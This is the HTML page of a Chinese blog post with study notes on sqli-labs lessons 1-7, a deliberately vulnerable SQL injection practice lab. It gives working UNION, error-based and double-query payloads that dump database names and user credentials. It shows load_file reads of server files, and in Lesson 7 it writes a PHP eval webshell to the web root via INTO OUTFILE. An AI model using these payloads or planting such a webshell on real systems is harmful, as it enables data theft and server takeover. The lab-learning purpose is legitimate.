@@ -1,0 +1,1351 @@
+<!DOCTYPE html>
+
+
+<script type="text/javascript" color="0,0,255" opacity="0.7" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="KbsMGM-cxbXLL8_ZMgd9HoISLGQPx2GAvxaINp0qzhQ">
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="iHKOwnN4RR">
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+
+
+
+
+
+  <meta name="keywords" content="SQL,Web安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SQLI和sqli-labsSQLI，也就是sql injection俗称SQL注入，关于SQL注入相信大家都不陌生，这里不做累赘。关于sqli-labs，是一个印度的程序员写的，用于学习SQL注入的教程，博客地址为：http://dummy2dummies.blogspot.com/ ,感兴趣的可以去看看，上面有一些示例。sqli-labs的安装网上教程一大把，需要注意的是环境的搭建，这里我选择">
+<meta name="keywords" content="SQL,Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs1-7学习笔记">
+<meta property="og:url" content="http://www.lntro.xyz/sqli-labs1-7学习笔记/index.html">
+<meta property="og:site_name" content="风再起时">
+<meta property="og:description" content="SQLI和sqli-labsSQLI，也就是sql injection俗称SQL注入，关于SQL注入相信大家都不陌生，这里不做累赘。关于sqli-labs，是一个印度的程序员写的，用于学习SQL注入的教程，博客地址为：http://dummy2dummies.blogspot.com/ ,感兴趣的可以去看看，上面有一些示例。sqli-labs的安装网上教程一大把，需要注意的是环境的搭建，这里我选择">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less10.png">
+<meta property="og:updated_time" content="2018-12-07T05:09:33.454Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs1-7学习笔记">
+<meta name="twitter:description" content="SQLI和sqli-labsSQLI，也就是sql injection俗称SQL注入，关于SQL注入相信大家都不陌生，这里不做累赘。关于sqli-labs，是一个印度的程序员写的，用于学习SQL注入的教程，博客地址为：http://dummy2dummies.blogspot.com/ ,感兴趣的可以去看看，上面有一些示例。sqli-labs的安装网上教程一大把，需要注意的是环境的搭建，这里我选择">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lntro.xyz/sqli-labs1-7学习笔记/">
+
+
+
+
+
+  <title>sqli-labs1-7学习笔记 | 风再起时</title>
+  <style>
+  .forkme{
+    display: none;
+  }
+  @media (min-width: 768px) {
+    .forkme{
+      display: inline;
+    }
+  }
+  </style>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?104760bf60098b3f7427cfbfb6fcefb6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+  <div class="forkme">
+    <a href="https://github.com/1ntro"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+  </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">风再起时</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">你看，整片星空都是我的</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lntro.xyz/sqli-labs1-7学习笔记/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Intro">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://raw.githubusercontent.com/1ntro/image/master/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风再起时">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqli-labs1-7学习笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-26T23:19:29+08:00">
+                2018-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL注入/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="SQLI和sqli-labs"><a href="#SQLI和sqli-labs" class="headerlink" title="SQLI和sqli-labs"></a>SQLI和sqli-labs</h2><p>SQLI，也就是sql injection俗称SQL注入，关于SQL注入相信大家都不陌生，这里不做累赘。<br>关于sqli-labs，是一个印度的程序员写的，用于学习SQL注入的教程，博客地址为：<a href="http://dummy2dummies.blogspot.com/" target="_blank" rel="noopener">http://dummy2dummies.blogspot.com/</a> ,感兴趣的可以去看看，上面有一些示例。<br>sqli-labs的安装网上教程一大把，需要注意的是环境的搭建，这里我选择的是apache+mysql+php。环境的配置相对比较复杂，嫌麻烦的话可以了解一下<a href="http://phpstudy.php.cn/" target="_blank" rel="noopener">phpstudy</a><a id="more"></a><br>好了，准备工作就绪后就可以开始我们精彩的游戏啦！</p>
+<h2 id="Less-1-基于错误"><a href="#Less-1-基于错误" class="headerlink" title="Less-1 基于错误"></a>Less-1 基于错误</h2><p>首先我们输入<code>id=1&#39;</code>,得到如下结果<img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less1.png" alt="1538121478810"></p>
+<p>上述错误告诉我们提交到SQL中的<code>1&#39;</code>经过构造后变成了<code>&#39;1&#39;&#39; LIMIT 0,1</code>，多了一个 ‘。这种从错误信息中获得我们需要的信息，接着我们就可以通过注释符去掉多余的’</p>
+<p><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less2.png" alt="1538121686994"></p>
+<p>此时返回正常数据，这里我们分析下源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这里没有对<code>id</code>参数进行任何过滤，当提交<code>1&#39; or 1=1--+</code>时，构造的sql语句就成了<code>SELECT * FROM users WHERE id=&#39;1&#39; or 1=1--+&#39; LIMIT 0,1</code>，恒为真。</p>
+<p>然后我们准备注入，这里用到<strong>union联合注入</strong>、<strong>information_schema数据库</strong>，简单介绍下</p>
+<p><strong>SQL UNION语法</strong><br>如果使用UNION操作符组合两个查询的结果，这两个结果必须结构相同，也就是说他们的列数必须相同，必须按照相同顺序出现的相同或兼容的数据类型（整数会隐含地转换为字符型，所以一般都用select 1，2，3…）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT column_name(s) FROM table_name1</span><br><span class="line">&gt; UNION</span><br><span class="line">&gt; SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>
+
+<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。 </p>
+<p><strong>SQL UNION ALL语法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; SELECT column_name(s) FROM table_name1</span><br><span class="line">&gt; UNION ALL</span><br><span class="line">&gt; SELECT column_name(s) FROM table_name2</span><br></pre></td></tr></table></figure>
+
+<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 </p>
+<p><strong>information_schema</strong><br>information_schema 数据库是MySQL自带的信息数据库，保存着关于MySQL服务器所有其他数据库的信息，类似于数据字典，如数据库名，表名，表的访问权限，列名，索引，约束等。 <img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less3.png" alt="1538123362609"></p>
+<p>SCHEMATA表：提供所有数据库的信息，show databases的结果取之此表<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less6.png" alt="1538138724786"></p>
+<p>TABLES表：提供数据库中表的信息<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less7.png" alt="1538138752770"></p>
+<p>COLUMNS表：提供表中列的信息<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less8.png" alt="1538138795033"></p>
+<p>利用<code>order by</code>，对前面的数据进行排序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;order by 1--+ </span><br><span class="line">&apos;order by 2--+ </span><br><span class="line">&apos;order by 3--+ </span><br><span class="line">&apos;order by 4--+ 得到报错信息 Unknown column &apos;4&apos; in &apos;order clause&apos;，说明只有三列数据</span><br></pre></td></tr></table></figure>
+
+<p>按照一般的注入流程：爆库，爆表，爆列名，爆数据<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less4.png" alt="1538128644404"><br>依次执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata--+ //爆数据库</span><br><span class="line">?id=-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+ //爆security库的数据表</span><br><span class="line">?id=-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+ //爆users表的列</span><br><span class="line">?id=-1&apos;union select 1,username,password from users where id=2--+ //爆数据</span><br><span class="line">ps:id=-1，联合查询时前一个语句为空，就能把后面的语句的内容显示出来</span><br></pre></td></tr></table></figure>
+
+<p>得到我们想要的数据<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less5.png" alt="1538139248042"></p>
+<h2 id="Less-2-基于错误"><a href="#Less-2-基于错误" class="headerlink" title="Less-2 基于错误"></a>Less-2 基于错误</h2><p>照例我们提交<code>?id=1&#39;</code>，得到错误回显<code>&#39; LIMIT 0,1</code>，似乎是单引号破坏了查询，于是我们尝试<code>?id=1--+</code>，发现没有错误返回，查看源码发现对<code>id</code>参数没有任何处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们的payload只需要将Less-1中的<code>?id=-1&#39; union...</code>中的单引号去掉就OK</p>
+<h2 id="Less-3-基于错误"><a href="#Less-3-基于错误" class="headerlink" title="Less-3 基于错误"></a>Less-3 基于错误</h2><p>还是提交<code>?id=1&#39;</code>，这次得到报错是<code>&#39;1&#39;&#39;) LIMIT 0,1</code>，这里我们可以猜想查询语句应该为<code>(&#39;$id&#39;)</code>，所以成功的注入<code>1&#39;) or 1=1--+</code>，payload和Less-1相比差别不大，利用<code>?id=-1&#39;)union...</code></p>
+<h2 id="Less-4-基于错误"><a href="#Less-4-基于错误" class="headerlink" title="Less-4 基于错误"></a>Less-4 基于错误</h2><p>提交<code>?id=1&#39;</code>后并没有得到报错，于是使用<code>?id=1&quot;</code>，报错得到<code>&quot;1&quot;&quot;) LIMIT 0,1</code>，很显然查询语句为<code>(&quot;$id&quot;)</code>，所以payload在上一个的基础上改为<code>?id=-1&quot;)union...</code>即可</p>
+<h2 id="Less-5-双查询注入"><a href="#Less-5-双查询注入" class="headerlink" title="Less-5 双查询注入"></a>Less-5 双查询注入</h2><p>这一题相比前面的题难在没有数据库的回显数据，只能看到数据库的报错回显，这里用到了一种新技术</p>
+<h3 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h3><p>双查询就是一个select语句中再嵌套一个select语句，看个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count((select database()));</span><br><span class="line">+----------------------------+</span><br><span class="line">| count((select database())) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          1 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>对于双查询注入，我们需要了解几个函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count() //计数函数</span><br><span class="line">rand() //随机函数</span><br><span class="line">floor() //取整函数</span><br><span class="line">group by语句 //分类</span><br></pre></td></tr></table></figure>
+
+<p>rand()返回的0-1之间的随机数，floor()返回小于等于输入数的整数，将rand()和floor()结合起来会有意想不到的效果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(rand()*2);</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*2) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>
+
+<p><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));</code>返回数据库名在和0或1连接，也就是security0或security1，如果在这条语句后加上from一个表，就会返回该表查询结果的数量条数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from users;</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| CONCAT((SELECT database()), FLOOR(RAND()*2)) |</span><br><span class="line">+----------------------------------------------+</span><br><span class="line">| security0                                    |</span><br><span class="line">| security0                                    |</span><br><span class="line">| security1                                    |</span><br><span class="line">| security1                                    |</span><br><span class="line">| security1                                    |</span><br><span class="line">| security1                                    |</span><br><span class="line">| security0                                    |</span><br><span class="line">| security0                                    |</span><br><span class="line">| security0                                    |</span><br><span class="line">| security1                                    |</span><br><span class="line">| security0                                    |</span><br><span class="line">| security0                                    |</span><br><span class="line">| security1                                    |</span><br><span class="line">+----------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>现在我们加上group by 语句，这里我们使用Information_schema.tables或information_schema.columns来查询，因为这两个表中的数据比较多，产生很多的随机值，不至于全是security0。<br><code>select concat((select database()),floor(rand()*2))as a from information_schema.tables group by a;</code></p>
+<p>as a 将前部分的查询结果名别名a,然后使用它进行分组，就把security0分到一组，security1分到另一组。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat((select database()),floor(rand()*2))as a from information_schema.tables group by a;</span><br><span class="line">+-----------+</span><br><span class="line">| a         |</span><br><span class="line">+-----------+</span><br><span class="line">| security0 |</span><br><span class="line">| security1 |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>这里的database()可以换成任何你想查询的函数，version(),user(),datadir()，或者查表，查列。<br>最后，我们加上count(*)函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &apos;security0&apos; for key &apos;group_key&apos;</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>报错了，从报错信息中可以看到我们想要查询的数据。类似查询version(),user()也是一样的操作</p>
+<h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><p>根据上述的知识，这里我们构造payload<code>?id=&#39; union select 1,count(*),concat(&#39;__&#39;,(select database()),floor(rand()*2),&#39;__&#39;)as a from information_schema.tables group by a--+</code>成功得到回显。</p>
+<p><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less9.png" alt="1538204230650"></p>
+<h2 id="Less-6-双查询注入"><a href="#Less-6-双查询注入" class="headerlink" title="Less-6 双查询注入"></a>Less-6 双查询注入</h2><p>和第五题类似，将单引号改为双引号即可。</p>
+<h2 id="Less-7-通过outfile下载数据库"><a href="#Less-7-通过outfile下载数据库" class="headerlink" title="Less-7  通过outfile下载数据库"></a>Less-7  通过outfile下载数据库</h2><h3 id="导入导出基础知识"><a href="#导入导出基础知识" class="headerlink" title="导入导出基础知识"></a>导入导出基础知识</h3><h4 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h4><p>load_file(file_name) 读取文件并返回该文件的内容作为一个字符串。条件必须满足以下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 文件必须是完全可读取的  and (select count(*) from mysql.user)&gt;0) //返回正常，说明有读写权限，如果返回错误，则没有权限</span><br><span class="line">&gt; 要读取的文件必须在服务器上</span><br><span class="line">&gt; 必须指定该文件的完整路径</span><br><span class="line">&gt; 要读取的文件必须小于 max_allowed_packet</span><br></pre></td></tr></table></figure>
+
+<p>示例：<code>select 1,2,load_file(&quot;e:\\fl4g.txt&quot;)</code></p>
+<p><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less11.png" alt="1538231881735"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,load_file(&quot;e:\\fl4g.txt&quot;),3--+  //路径中的/用\\代替</span><br><span class="line">?id=-1&apos; union select 1,load_file(0x653a5c5c666c34672e747874),3--+  //将路径改为16进制</span><br><span class="line">?id=-1&apos; union select 1,load_file(char(101,58,92,92,102,108,52,103,46,116,120,116)),3--+  //类似的改为ASCII码</span><br></pre></td></tr></table></figure>
+
+<h4 id="select…into-outfile"><a href="#select…into-outfile" class="headerlink" title="select…into outfile"></a>select…into outfile</h4><p>select…into outfile ‘file_name’ 可以把选择的行写入一个文件中。该文件会创建到服务器主机上。select version() into outfile “e:\1.txt”这里将version()改为一句话，可以直接连接一句话，还可以上传很多，只要你想得到</p>
+<p>示例：<code>?id=-1&#39; union select database(),version(),@@datadir into outfile &#39;e:\\1.txt&#39;--+</code><br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less12.png" alt="1538233583541"></p>
+<h3 id="题目思路"><a href="#题目思路" class="headerlink" title="题目思路"></a>题目思路</h3><p>本关卡的标题为dump into outfile，提示我们利用文件导入的方式注入，如何进行文件导入？利用<code>select ... into outfile &#39;file_name&#39;</code>插入一句话木马到服务器（注意<code>file_name</code>不能是一个已经存在的文件）<br>从源码中，我们观察到<code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code>，<code>id</code>参数做了<code>&#39;))</code>处理，于是我们尝试<code>&#39;)) or 1=1--+</code>没有报错，于是利用上述的导入文件方法上传一句话木马：<br><code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_post[&quot;1ntro&quot;])?&gt;&#39; into outfile &quot;e:\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\1ntro.php&quot;--+</code>可以看到虽然报错了，但是其实文件上传成功了<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less10.png" alt="1538226879637"></p>
+<p>这时候用菜刀或webshell工具连接即可。</p>
+
+      
+    </div>
+    <div>
+      
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">
+              -------------本文结束<i class="fa fa-paw"></i>感谢阅读-------------
+        </div>
+    
+</div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>谢谢您请我吃糖~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="https://raw.githubusercontent.com/1ntro/image/master/wechat.png" alt="Intro 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="https://raw.githubusercontent.com/1ntro/image/master/pay.png" alt="Intro 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags"> 
+		  
+ 		    <a href="/tags/SQL/" rel="tag"><i class="fa fa-tag"></i> SQL</a> 
+		  
+ 		    <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a> 
+		   
+		</div>
+		
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Kali-Linux学习笔记-2/" rel="next" title="Kali-Linux学习笔记-2">
+                <i class="fa fa-chevron-left"></i> Kali-Linux学习笔记-2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/sqli-labs8-16学习笔记/" rel="prev" title="sqli-labs8-16学习笔记">
+                sqli-labs8-16学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MTUxNS8xODA2Mg=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
